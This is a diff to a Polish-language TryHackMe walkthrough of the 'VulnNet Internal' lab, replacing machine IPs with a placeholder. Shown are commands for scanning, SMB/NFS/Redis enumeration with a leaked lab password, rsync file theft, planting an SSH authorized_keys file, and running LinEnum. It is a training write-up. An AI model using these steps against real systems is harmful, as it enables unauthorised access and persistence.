@@ -78,7 +78,7 @@ gobuster vhost -u http://ip-10-200-111-33.eu-west-1.compute.internal:80/ -wlist_
 
 ```
 ┌──(root㉿kali)-[~]
-└─# sudo nmap -Pn -A -sV --script=default,vuln -p- --open -oA 10.10.238.20_nmap 10.10.238.20
+└─# sudo nmap -Pn -A -sV --script=default,vuln -p- --open -oA 10.10.238.20_nmap <IP_atakowanej_masz>
 ```
 Z zapisanego pliku z nmap-a ```gerp-uje``` otwarte porty.
 
@@ -87,7 +87,7 @@ Z zapisanego pliku z nmap-a ```gerp-uje``` otwarte porty.
 Dalszą opserwację skupiam na SMB (porty 139 i 445). Za pomocą ```enum4linux``` sprawdzam co tam się znajduję.
 ```
 ┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
-└─$ enum4linux -a 10.10.3.126 
+└─$ enum4linux -a <IP_atakowanej_masz> 
 ```
 ![;(](/screens/v_enum4linux.gif)
 
@@ -96,7 +96,7 @@ Za pomocą ```enum4linux``` znalazłem również użytkownika ```sys-internal```
 2. Za pomocą polecenia ```smbclient``` sprawdzam i pobieram wszystkie zasobi z katalogu ```//IP_maszyny/shares```.
 ```
 ┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
-└─$ smbclient -N //10.10.39.174/shares
+└─$ smbclient -N //<IP_atakowanej_masz>/shares
 
 smb: \> ls
 
@@ -122,7 +122,7 @@ Następnie pobieram i przeglądam wszystkie dane. Zwracam uwagę na plik ```redi
 ┌──(kali㉿kali)-[~]
 └─$ mkdir /tmp/mount  
 ┌──(kali㉿kali)-[~]
-└─$ sudo mount -t nfs 10.10.161.43: /tmp/mount/ -nolock
+└─$ sudo mount -t nfs <IP_atakowanej_masz>: /tmp/mount/ -nolock
 [sudo] password for kali: 
                                                                                  
 ┌──(kali㉿kali)-[~]
@@ -283,7 +283,7 @@ requirepass "B65Hx562F@ggAZ@F"
 ┌──(root㉿kali)-[~]
 └─# sudo apt-get install redis-tools
 ┌──(kali㉿kali)-[~/Desktop/TryHackMe]
-└─$ redis-cli -h 10.10.161.43 -a "B65Hx562F@ggAZ@F"
+└─$ redis-cli -h <IP_atakowanej_masz> -a "B65Hx562F@ggAZ@F"
 Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
 10.10.161.43:6379> ls
 (error) ERR unknown command 'ls'
@@ -335,12 +335,12 @@ Uzyskuję możliwość logowania za pomocą ```rsync```.
 4. Rsync - po zalogowaniu się okazało się, że możemy zobaczyć plik txt z kolejną flagą ale nie miałem pomysłu jak mogę go pobrać lub otworzyć. W rozwiązaniu tego plroblemu bardzo pomocny okazał się [ChatGPT](https://chat.openai.com/chat). Pobralem załą zawartość do której dawał mi dostęp ```rsync```. Po pobraniu katalogu ```files``` za pomocą polecenia ```sudo chmod -R 777 sys-internal``` zmieniłem uprawnienia dla wszystkich plików. W ten sposób zdobyłem kolejna flage.
 ```                              
 ┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
-└─$ rsync --list-only rsync://rsync-connect@10.10.161.43/files/sys-internal
+└─$ rsync --list-only rsync://rsync-connect@<IP_atakowanej_masz>/files/sys-internal
 Password: 
 drwxr-xr-x          4,096 2021/02/06 07:49:29 sys-internal
                                                                                  
 ┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
-└─$ rsync --list-only rsync://rsync-connect@10.10.161.43/files/sys-internal/
+└─$ rsync --list-only rsync://rsync-connect@<IP_atakowanej_masz>/files/sys-internal/
 Password: 
 drwxr-xr-x          4,096 2021/02/06 07:49:29 .
 -rw-------             61 2021/02/06 07:49:28 .Xauthority
@@ -372,13 +372,13 @@ drwxr-xr-x          4,096 2021/02/01 07:53:22 Public
 drwxr-xr-x          4,096 2021/02/01 07:53:22 Templates
 drwxr-xr-x          4,096 2021/02/01 07:53:22 Videos
 
-rsync -r rsync://rsync-connect@10.10.120.63/files/ ./rsync
+rsync -r rsync://rsync-connect@<IP_atakowanej_masz>/files/ ./rsync
 ```
 Za pomoca polecenia ```ssh-keygen``` po wygenerowaniu kluczy publiczny i prywatrny zmieniam nazwe klucza publicznego za pomoca polecenia ```cp id-rsa.pub auhorized_keys```
 nastepnie kopiuje klucz publiczny poleceniem:
 ```
 ┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
-└─$ rsync -r authorized_keys rsync://rsync-connect@10.10.240.197/files/sys-internal/.ssh/
+└─$ rsync -r authorized_keys rsync://rsync-connect@<IP_atakowanej_masz>/files/sys-internal/.ssh/
 ```
 
 Podobnie robię z aplikacją ```LinEnum``` którą pobieram z [GitHub](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) na własną maszynę poleceniem:
@@ -388,9 +388,9 @@ git clone https://github.com/rebootuser/LinEnum.git
 Następnie za pomocą ```rsync``` kopiuję plik ```LinEnum.sh``` i jak już zaloguję się przez ssh za pomocą wcześniej utworzonych pary kluczy tworzę raport który pobieram w celu analizy.
 ```
 ┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
-└─$ rsync -r LinEnum.sh rsync://rsync-connect@10.10.240.197/files/sys-internal/.ssh/
+└─$ rsync -r LinEnum.sh rsync://rsync-connect@<IP_atakowanej_masz>/files/sys-internal/.ssh/
 ┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
-└─$ ssh -i id_rsa sys-internal@10.10.240.197
+└─$ ssh -i id_rsa sys-internal@<IP_atakowanej_masz>
 
 sys-internal@vulnnet-internal:~$ ./LinEnum.sh -r raport.txt -e .
 ```
